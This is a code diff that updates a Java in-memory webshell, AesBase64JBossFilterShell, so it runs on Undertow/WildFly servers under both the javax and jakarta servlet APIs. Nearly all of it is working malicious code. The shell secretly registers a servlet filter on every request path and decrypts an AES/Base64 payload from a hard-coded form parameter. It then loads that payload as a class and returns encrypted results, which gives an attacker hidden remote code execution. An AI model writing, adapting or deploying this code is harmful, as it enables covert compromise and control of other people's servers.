@@ -1,10 +1,12 @@
-import javax.servlet.*;
-import java.io.IOException;
 import java.io.PrintWriter;
-import java.lang.reflect.*;
-import java.util.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+import java.util.HashSet;
 
-public class AesBase64JBossFilterShell extends ClassLoader implements Filter {
+//all version undertow/wildfly
+public class AesBase64JBossFilterShell extends ClassLoader implements InvocationHandler {
     private static Class payloadClass;
     private String key = "3c6e0b8a9c15224a";
     private String password = "pass";
@@ -24,9 +26,19 @@ public class AesBase64JBossFilterShell extends ClassLoader implements Filter {
 
     private void addFilter() {
         try {
-            addFilter(this.getClass());
+            Class servletFilterClass = null;
+            try {
+                servletFilterClass = loadClassEx("jakarta.servlet.Filter");
+            } catch (Exception e) {
+                try {
+                    servletFilterClass = loadClassEx("javax.servlet.Filter");
+                } catch (ClassNotFoundException ex) {
+                }
+            }
+            if (servletFilterClass != null) {
+                addFilter(java.lang.reflect.Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{servletFilterClass}, this));
+            }
         } catch (Throwable e) {
-
         }
     }
 
@@ -38,23 +50,33 @@ public class AesBase64JBossFilterShell extends ClassLoader implements Filter {
         return contexts.toArray();
     }
 
-    private boolean addFilter(Class filterClass) throws Throwable {
+    private boolean addFilter(Object filter) throws Throwable {
         boolean isOk = false;
         try {
             Object[] obj = getContexts();
             for (int i = 0; i < obj.length; i++) {
                 Object currentServletContext = obj[i];
                 try {
+                    Class dispatcherTypeClass = null;
+                    try {
+                        dispatcherTypeClass = loadClassEx("jakarta.servlet.DispatcherType");
+                    } catch (ClassNotFoundException e) {
+                        dispatcherTypeClass = loadClassEx("javax.servlet.DispatcherType");
+                    }
+
                     Class filterInfoClass = loadClassEx("io.undertow.servlet.api.FilterInfo");
+                    Class instanceFactoryClass = loadClassEx("io.undertow.servlet.api.InstanceFactory");
+                    Class immediateInstanceFactoryClass = loadClassEx("io.undertow.servlet.util.ImmediateInstanceFactory");
                     Object deploymentInfo = getFieldValue(currentServletContext, "deploymentInfo");
-                    Class targetFilter = filterClass;
-                    Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(targetFilter.getName(), targetFilter);
+                    Object immediateInstanceFactory = immediateInstanceFactoryClass.getConstructor(Object.class).newInstance(filter);
+                    Class targetFilter = filter.getClass();
+                    Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class, instanceFactoryClass).newInstance(targetFilter.getName(), targetFilter, immediateInstanceFactory);
                     deploymentInfo.getClass().getMethod("addFilter", filterInfoClass).invoke(deploymentInfo, filterInfo);
                     Object deploymentImpl = getFieldValue(currentServletContext, "deployment");
                     Object managedFilters = deploymentImpl.getClass().getMethod("getFilters").invoke(deploymentImpl);
                     managedFilters.getClass().getMethod("addFilter", filterInfoClass).invoke(managedFilters, filterInfo);
-                    deploymentInfo.getClass().getMethod("insertFilterUrlMapping", int.class, String.class, String.class, DispatcherType.class).
-                            invoke(deploymentInfo, 0, targetFilter.getName(), "/*", DispatcherType.REQUEST);
+                    deploymentInfo.getClass().getMethod("insertFilterUrlMapping", int.class, String.class, String.class, dispatcherTypeClass).
+                            invoke(deploymentInfo, 0, targetFilter.getName(), "/*", Enum.valueOf(dispatcherTypeClass, "REQUEST"));
                     isOk = true;
                 } catch (Throwable e) {
 
@@ -218,55 +240,116 @@ public class AesBase64JBossFilterShell extends ClassLoader implements Filter {
         return value;
     }
 
+    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
+        try {
+            ArrayList classes = new ArrayList();
+            if (parameters != null) {
+                for (int i = 0; i < parameters.length; i++) {
+                    Object o1 = parameters[i];
+                    if (o1 != null) {
+                        classes.add(o1.getClass());
+                    } else {
+                        classes.add(null);
+                    }
+                }
+            }
+            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[]{}));
 
-    @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
+            return method.invoke(obj, parameters);
+        } catch (Throwable e) {
+//        	e.printStackTrace();
+        }
+        return null;
+    }
 
+    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
+        Method method = null;
+        while (cs != null) {
+            try {
+                method = cs.getMethod(methodName, parameters);
+                cs = null;
+            } catch (Exception e) {
+                cs = cs.getSuperclass();
+            }
+        }
+
+        if (method != null) {
+            try {
+                method.setAccessible(true);
+            } catch (Throwable e) {
+
+            }
+        }
+
+        return method;
+    }
+
+    private String getParameter(Object requestObject, String name) {
+        return (String) invokeMethod(requestObject, "getParameter", name);
+    }
+
+    private String getContentType(Object requestObject) {
+        return (String) invokeMethod(requestObject, "getContentType");
     }
 
     @Override
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        String contentType = servletRequest.getContentType();
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        if (method.getName().equals("doFilter")) {
+            Object servletRequest = args[0];
+            Object servletResponse = args[1];
+            Object filterChain = args[2];
+            if (!run(servletRequest, servletResponse)) {
+                Class requestClass = method.getParameterTypes()[0];
+                Class responseClass = method.getParameterTypes()[1];
+
+                getMethodByClass(filterChain.getClass(), "doFilter", requestClass, responseClass).invoke(filterChain, servletRequest, servletResponse);
+            }
+        }
+        return null;
+    }
+
+    private boolean run(Object request, Object response) {
         try {
-            if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
-                String value = servletRequest.getParameter(password);
-                if (value != null) {
-                    byte[] data = base64Decode(value);
-                    data = aes(data, false);
-                    if (data != null && data.length > 0) {
-                        if (payloadClass == null) {
-                            ClassLoader loader = Thread.currentThread().getContextClassLoader();
-                            if (loader == null) {
-                                loader = servletRequest.getClass().getClassLoader();
-                            }
-                            payloadClass = new AesBase64JBossFilterShell(loader).defineClass(data, 0, data.length);
-                        } else {
-                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
-                            Object f = payloadClass.newInstance();
-                            f.equals(arrOut);
-                            f.equals(servletRequest);
-                            f.equals(data);
-                            f.toString();
-                            String md5 = md5(password + key);
-                            if (arrOut.size() > 0) {
-                                PrintWriter printWriter = servletResponse.getWriter();
-                                printWriter.write(md5.substring(0, 16));
-                                printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
-                                printWriter.write(md5.substring(16));
-                                return;
+            try {
+                String contentType = getContentType(request);
+                if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
+                    String value = getParameter(request, password);
+                    if (value != null) {
+                        byte[] data = base64Decode(value);
+                        data = aes(data, false);
+                        if (data != null && data.length > 0) {
+                            if (payloadClass == null) {
+                                ClassLoader loader = Thread.currentThread().getContextClassLoader();
+                                if (loader == null) {
+                                    loader = request.getClass().getClassLoader();
+                                }
+
+                                payloadClass = new AesBase64JBossFilterShell(loader).defineClass(data, 0, data.length);
+                            } else {
+                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+                                Object f = payloadClass.newInstance();
+                                f.equals(arrOut);
+                                f.equals(request);
+                                f.equals(data);
+                                f.toString();
+                                String md5 = md5(password + key);
+                                if (arrOut.size() > 0) {
+                                    PrintWriter printWriter = (PrintWriter) invokeMethod(response, "getWriter");
+                                    printWriter.write(md5.substring(0, 16));
+                                    printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
+                                    printWriter.write(md5.substring(16));
+                                    return true;
+                                }
                             }
                         }
                     }
                 }
+
+            } catch (Throwable ignored) {
             }
-        } catch (Throwable e) {
+        } catch (Throwable ignored) {
 
         }
-        filterChain.doFilter(servletRequest, servletResponse);
-    }
-
-    @Override
-    public void destroy() {
-
+        return false;
     }
 }
